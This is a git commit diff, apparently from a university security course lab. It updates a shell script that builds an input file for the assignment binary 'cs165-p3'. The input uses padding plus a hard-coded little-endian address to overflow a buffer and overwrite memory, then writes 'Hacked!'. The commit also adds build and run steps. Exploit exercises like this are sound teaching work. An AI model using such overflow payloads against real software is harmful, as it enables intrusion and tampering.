01d0d7f2f85335736e927a0c70cb84dfc3038ecd
jecndlria <jecndlria@gmail.com>
2024-03-08 23:40:09 -0800

    init part 2 and 3

--- p3/part1.sh
+++ p3/part1.sh
@@ -1,3 +1,5 @@
 # This script creates the part1 file used to execute the first part.
+make
 echo -e "add 1 string test 0000000000000000000000000000000000\x50\x85\x04\x08" > part1
 echo -e "change 1 Hacked! test" >> part1
+./cs165-p3 part1 output
